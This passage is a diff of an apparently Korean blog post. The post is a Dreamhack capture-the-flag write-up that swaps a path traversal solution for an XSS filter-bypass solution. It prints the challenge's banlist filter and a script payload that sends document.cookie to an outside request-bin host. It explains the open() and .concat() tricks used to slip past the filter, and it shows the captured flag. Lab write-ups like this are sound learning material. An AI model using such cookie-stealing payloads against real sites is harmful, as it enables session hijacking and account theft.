class="sh">"</span><span class="s">location</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">href</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">window</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">eval</span><span class="sh">"</span><span class="p">]</span>
 
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://&lt;서버주소&gt;/get_info</span><span class="sh">"</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">../flag</span><span class="sh">"</span><span class="p">})</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">payload</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">payload</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">show your payload!</span><span class="sh">"</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="nf">any</span><span class="p">(</span><span class="n">banned</span> <span class="ow">in</span> <span class="n">payload</span> <span class="k">for</span> <span class="n">banned</span> <span class="ow">in</span> <span class="n">banlist</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Nope!</span><span class="sh">"</span>
+
+    <span class="nb">input</span> <span class="o">=</span> <span class="nf">sanitize_input</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="nb">input</span><span class="si">}</span><span class="sh">"</span>
+
+
+</pre></td></tr></tbody></table></code></div></div>
+<p>이 문제는 <code class="language-plaintext highlighter-rouge">payload.lower()</code>함수로 인해 입력한 페이로드를 모두 소문자화하기 때문에, 페이로드를 대문자로 작성하여 필터링을 우회하는 방법을 사용하기는 어렵다.</p>
+
+<p>또한 <code class="language-plaintext highlighter-rouge">memo</code>와 같이 내부 서버에서 웹사이트에서 데이터를 수정할 수 있는 명령어가 없기 때문에, 외부 서버를 활용하여 문제를 풀어주어야 한다.</p>
+
+<h2 id="드림핵-툴-request-bin-활용하기"><span class="mr-2">드림핵 툴 Request Bin 활용하기</span><a href="#드림핵-툴-request-bin-활용하기" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><code class="language-plaintext highlighter-rouge">드림핵</code>의 <code class="language-plaintext highlighter-rouge">Request Bin</code> 툴을 사용하면, 드림핵 툴에서 임의로 웹 주소를 하나 만들어주게 된다.
+이때, 해당 주소에 요청을 보내게 되면, <code class="language-plaintext highlighter-rouge">드림핵</code>의 <code class="language-plaintext highlighter-rouge">Request Bin </code>도구에서 어떤 요청이 왔었는지 조회할 수 있게 도와준다.
+따라서 우리는 <code class="language-plaintext highlighter-rouge">Request Bin</code>도구를 활용하여 해킹하고자 하는 서버의 어드민이 ‘플래그와 함께’ 이 주소로 요청을 보내도록 만들어주어야 한다.</p>
+
+<h2 id="페이로드"><span class="mr-2">페이로드</span><a href="#페이로드" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>드림핵 서버 주소:포트/flag?answer=&lt;script&gt;open("http://ogwvzgn.request.dreamhack.games/?c=" + document.cookie)&lt;/script&gt;
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>해당 요청을 전송하면 <code class="language-plaintext highlighter-rouge">get_info.html</code>파일 속에 플래그가 함께 담겨 나오게 된다.</p>
+<p><code class="language-plaintext highlighter-rouge">open()</code>함수는 <code class="language-plaintext highlighter-rouge">window.open()</code> 을 생략한 함수로, 원래는 파라미터 속 주소에 대한 창을 새로 띄우는 함수이지만, 창을 띄우는 동시에 <code class="language-plaintext highlighter-rouge">GET</code>요청을 보낸다는 특징을 이용해 필터에 의해 사용하지 못하는<code class="language-plaintext highlighter-rouge">fetch()</code>함수의 대체재로 사용한다.</p>
+
+<h2 id="문제-발생"><span class="mr-2">문제 발생</span><a href="#문제-발생" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>이때, 페이로드 속에 작성되어있는 기호 <code class="language-plaintext highlighter-rouge">+</code> 에서 문제가 발생하였다.
+<code class="language-plaintext highlighter-rouge">HTML</code>의 <code class="language-plaintext highlighter-rouge">application/x-www-form-urlencoded</code> 인코딩 방식에 의해서 나의 브라우저가 <code class="language-plaintext highlighter-rouge">+</code> 기호를 공백 취급하면서 GET요청을 보내게 된다.</p>
+
+<p>이 문제를 해결하기 위해 <code class="language-plaintext highlighter-rouge">+</code>라는 기호를 사용하는 대신 <code class="language-plaintext highlighter-rouge">.concat()</code>이라는 함수를 사용하여 <code class="language-plaintext highlighter-rouge">+</code> 기호의 역할을 대신해주어야 한다.</p>
+
+<h2 id="수정된-페이로드"><span class="mr-2">수정된 페이로드</span><a href="#수정된-페이로드" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>드림핵 서버 주소:포트/flag?answer=&lt;script&gt;open("http://ogwvzgn.request.dreamhack.games/?c=".concat(document.cookie))&lt;/script&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="정답-확인"><span class="mr-2">정답 확인</span><a href="#정답-확인" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>드립핵의 <code class="language-plaintext highlighter-rouge">Request Bin</code> 도구로 돌아와 요청을 받은 기록을 확인하면</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>Client IP
+000.000.000.000
+Method
+GET
+Path
+/
+Query String
+c=flag=4TH3N3{You_love_xss_too_dont_you?}
+</pre></td></tr></tbody></table></code></div></div>
+<p>위와 같이 플래그와 함께 <code class="language-plaintext highlighter-rouge">GET</code>요청이 날아온 것을 확인할 수 있다.</p>
 
 <h1 id="정답">정답</h1>
 
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
+<p>4TH3N3{You_love_xss_too_dont_you?}</p>
 
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://&lt;서버주소&gt;/get_info</span><span class="sh">"</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">../flag</span><span class="sh">"</span><span class="p">})</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
-</pre></td></tr></tbody></table></code></div></div>
 </div>
 
 <div class="post-tail-wrapper text-muted">
@@ -1258,46 +1437,46 @@
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1633,17 +1812,17 @@ Path Traversal문제와 광장히 유사하여 먼저 Path Traversal문제를 �
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/Dreamhack_image-storage/" class="btn btn-outline-primary"
+  <a href="/posts/Dreamhack_XSS-Filtering-Bypass/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>[Dreamhack] image-storage 해설</p>
+    <p>[Dreamhack] XSS Filtering Bypass 해설</p>
   </a>
   
 
   
-  <a href="/posts/Dreamhack_Xss-2/" class="btn btn-outline-primary"
+  <div class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>[Dreamhack] Xss-2 해설</p>
-  </a>
+    <p>-</p>
+  </div>
   
 
 </div>
